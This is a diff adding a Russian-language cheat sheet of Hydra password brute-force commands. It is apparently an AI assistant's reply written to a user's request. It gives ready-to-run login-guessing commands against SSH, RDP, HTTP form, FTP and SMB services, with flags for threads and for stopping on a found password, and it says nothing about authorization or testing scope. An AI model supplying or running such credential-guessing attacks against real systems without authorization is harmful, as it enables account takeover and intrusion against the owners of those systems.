@@ -1,0 +1,56 @@
+Вот тебе все основные команды Hydra в одном формате, как ты просил 👇
+
+🔐 SSH
+Один логин + список паролей
+hydra -l root -P passwords.txt ssh://192.168.1.10
+
+Список логинов + список паролей
+hydra -L users.txt -P passwords.txt ssh://192.168.1.10
+
+Кастомный порт
+hydra -l admin -P passwords.txt ssh://192.168.1.10:2222
+🖥️ RDP
+Один логин + список паролей
+hydra -l administrator -P passwords.txt rdp://192.168.1.10
+
+Список логинов + список паролей
+hydra -L users.txt -P passwords.txt rdp://192.168.1.10
+
+С доменом
+hydra -l admin -P passwords.txt rdp://192.168.1.10 -m "DOMAIN"
+🌐 HTTP (POST форма)
+Один логин + список паролей
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+
+Список логинов + список паролей
+hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+🌐 HTTP (GET форма)
+Один логин + список паролей
+hydra -l admin -P passwords.txt 192.168.1.10 http-get "/login.php?user=^USER^&pass=^PASS^"
+
+Список логинов + список паролей
+hydra -L users.txt -P passwords.txt 192.168.1.10 http-get "/login.php?user=^USER^&pass=^PASS^"
+📁 FTP
+Один логин + список паролей
+hydra -l ftpuser -P passwords.txt ftp://192.168.1.10
+
+Список логинов + список паролей
+hydra -L users.txt -P passwords.txt ftp://192.168.1.10
+🪟 SMB
+Один логин + список паролей
+hydra -l admin -P passwords.txt smb://192.168.1.10
+
+Список логинов + список паролей
+hydra -L users.txt -P passwords.txt smb://192.168.1.10
+⚡ Полезные параметры
+Потоки
+-t 4
+
+Показывать попытки
+-V
+
+Остановиться при успехе
+-f
+
+Кастомный порт
+-s 2222
